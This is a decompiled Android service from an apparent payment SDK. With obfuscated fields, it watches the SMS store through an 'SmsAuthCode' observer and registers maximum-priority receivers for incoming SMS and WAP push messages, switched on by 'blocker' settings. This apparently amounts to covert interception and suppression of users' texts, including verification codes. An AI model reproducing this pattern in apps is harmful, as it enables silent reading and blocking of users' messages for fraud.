package com.zhangzhifu.sdk.service;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.text.format.Time;
import com.zhangzhifu.sdk.util.sms.SmsReceiver;
import com.zhangzhifu.sdk.util.sms.WapPushReceiver;
import com.zhangzhifu.sdk.util.sms.util.SmsAuthCode;

public class ZhangzhifuSmsService
  extends Service
{
  private SmsReceiver dj = null;
  private WapPushReceiver dk = null;
  private SmsAuthCode dl = null;
  
  public ZhangzhifuSmsService() {}
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    this.dl = new SmsAuthCode(this, new Handler());
    getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, this.dl);
    super.onCreate();
  }
  
  public void onDestroy()
  {
    try
    {
      getContentResolver().unregisterContentObserver(this.dl);
      unregisterReceiver(this.dj);
      unregisterReceiver(this.dk);
      stopForeground(false);
      super.onDestroy();
      return;
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    paramIntent = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
    if ((paramIntent.getBoolean("enableservice", false)) && (paramIntent.getBoolean("enablesmsblocker", true)))
    {
      this.dj = new SmsReceiver();
      IntentFilter localIntentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
      localIntentFilter.setPriority(Integer.MAX_VALUE);
      registerReceiver(this.dj, localIntentFilter);
    }
    if (paramIntent.getBoolean("enableservice", false)) {
      paramIntent.getBoolean("enablemmsblocker", false);
    }
    if ((paramIntent.getBoolean("enableservice", false)) && (paramIntent.getBoolean("enablewappushblocker", true)))
    {
      this.dk = new WapPushReceiver();
      paramIntent = new IntentFilter("android.provider.Telephony.WAP_PUSH_RECEIVED");
      paramIntent.setPriority(Integer.MAX_VALUE);
      registerReceiver(this.dk, paramIntent);
    }
    new Time().setToNow();
    return 1;
  }
}
